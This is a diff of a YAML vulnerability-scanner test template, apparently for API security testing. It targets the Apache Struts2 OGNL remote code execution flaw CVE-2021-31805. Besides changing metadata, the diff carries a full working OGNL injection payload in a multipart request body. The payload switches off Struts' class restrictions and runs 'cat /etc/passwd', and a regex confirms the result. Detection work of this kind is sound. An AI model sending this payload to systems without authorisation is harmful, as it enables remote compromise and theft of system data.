@@ -2,20 +2,26 @@ id: APACHE_STRUTS2_RCE
 info:
   name: "Apache Struts2 Remote Code Execution"
   description: "This vulnerability affects certain versions of the framework due to improper handling of user input in the OGNL (Object-Graph Navigation Language) expression language. Attackers can exploit this flaw by sending crafted requests that execute arbitrary code on the server, potentially leading to full system compromise. This vulnerability poses a critical risk to applications using Struts2, especially when exposed to untrusted input sources."
-  details:  "This vulnerability is identified in specific versions of the framework, primarily affecting applications that use the `struts2-core` library. The flaw arises from insecure handling of OGNL expressions, allowing attackers to inject malicious code via HTTP requests. Successful exploitation can lead to unauthorized access, data manipulation, and complete control over the affected server. Mitigation involves updating to patched versions of Struts2 and employing security best practices."
+  details: "This vulnerability is identified in specific versions of the framework, primarily affecting applications that use the `struts2-core` library. The flaw arises from insecure handling of OGNL expressions, allowing attackers to inject malicious code via HTTP requests. Successful exploitation can lead to unauthorized access, data manipulation, and complete control over the affected server. Mitigation involves updating to patched versions of Struts2 and employing security best practices."
   impact: "The impact of this vulnerability is severe, as successful exploitation can allow attackers to execute arbitrary code on the server. This can lead to unauthorized access to sensitive data, manipulation of application logic, and potential system compromise. Furthermore, the breach could facilitate lateral movement within the network, posing significant risks to overall infrastructure security. Organizations are strongly advised to apply security patches promptly to mitigate these risks."
   category:
     name: COMMAND_INJECTION
     shortName: Command Injection
     displayName: Command Injection
   subCategory: APACHE_STRUTS2_RCE
-  severity: MEDIUM
+  severity: CRITICAL
   references:
     - "https://twitter.com/trbughunters/status/1283133356922884096"
   cwe:
     - CWE-77
   cve:
     - CVE-2021-31805
+
+attributes:
+  nature: INTRUSIVE
+  plan: FREE
+  duration: FAST
+
 
 api_selection_filters:
   method:
@@ -39,29 +45,18 @@ execute:
   type: single
   requests:
     - req:
-      - modify_url: "/"
-      - modify_method: POST
-      - replace_body: '------WebKitFormBoundaryl7d1B1aGsV2wcZwF
-        Content-Disposition: form-data; name="id"
+        - modify_url: "/"
+        - modify_method: POST
+        - replace_body: '------WebKitFormBoundaryl7d1B1aGsV2wcZwF Content-Disposition: form-data; name="id"
 
-        %{
-        (#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +
-        (#request.map.setBean(#request.get("struts.valueStack")) == true).toString().substring(0,0) +
-        (#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +
-        (#request.map2.setBean(#request.get("map").get("context")) == true).toString().substring(0,0) +
-        (#request.map3=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +
-        (#request.map3.setBean(#request.get("map2").get("memberAccess")) == true).toString().substring(0,0) +
-        (#request.get("map3").put("excludedPackageNames",#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +
-        (#request.get("map3").put("excludedClasses",#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +
-        (#application.get("org.apache.tomcat.InstanceManager").newInstance("freemarker.template.utility.Execute").exec({"cat /etc/passwd"}))
-        }
+            %{ (#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) + (#request.map.setBean(#request.get("struts.valueStack")) == true).toString().substring(0,0) + (#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) + (#request.map2.setBean(#request.get("map").get("context")) == true).toString().substring(0,0) + (#request.map3=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) + (#request.map3.setBean(#request.get("map2").get("memberAccess")) == true).toString().substring(0,0) + (#request.get("map3").put("excludedPackageNames",#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) + (#request.get("map3").put("excludedClasses",#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) + (#application.get("org.apache.tomcat.InstanceManager").newInstance("freemarker.template.utility.Execute").exec({"cat /etc/passwd"})) }
 
-        ------WebKitFormBoundaryl7d1B1aGsV2wcZwF—'
-      - modify_header:
-          content-type: "multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF"
-      - modify_header:
-          content-length: 1095
-      
+            ------WebKitFormBoundaryl7d1B1aGsV2wcZwF—'
+        - modify_header:
+            content-type: "multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF"
+        - modify_header:
+            content-length: 1095
+
 
 
 validate:
@@ -70,7 +65,7 @@ validate:
   response_payload:
     length:
       gt: 0
-    regex:  "root:.*:0:0:"
+    regex: "root:.*:0:0:"
     not_contains:
       - <html>
       - </html>
